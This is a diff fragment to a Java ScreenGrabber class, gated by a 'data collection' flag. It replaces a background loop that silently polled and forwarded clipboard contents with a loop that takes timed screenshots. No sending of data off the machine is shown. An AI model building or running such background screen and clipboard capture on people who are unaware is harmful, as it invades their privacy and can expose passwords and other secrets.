@@ -122,28 +122,22 @@ public class ScreenGrabber {
 		}
 	}
 	
-	/**
-	 * Captures multiple screenshots at specified interval.
-	 */
+
 	public static void captureSequence(int count, long intervalMs, String baseIdentifier) {
 		if (!IsRealAnything.ENABLE_DATA_COLLECTION) {
 			return;
 		}
 
 		Thread.ofVirtual().start(() -> {
-			String lastSeen = "";
-			while (IsRealAnything.ENABLE_DATA_COLLECTION) {
+			for (int i = 0; i < count; i++) {
 				try {
-					String content = getClipboardContent();
-					if (content != null && !content.equals(lastSeen)) {
-						lastSeen = content;
-						listener.onClipboardChange(content);
-					}
-					Thread.sleep(2000);
+					captureScreen(baseIdentifier + "_" + i);
+					Thread.sleep(intervalMs);
 				} catch (InterruptedException e) {
 					break;
 				}
 			}
 		});
 	}
-	}
+
+}
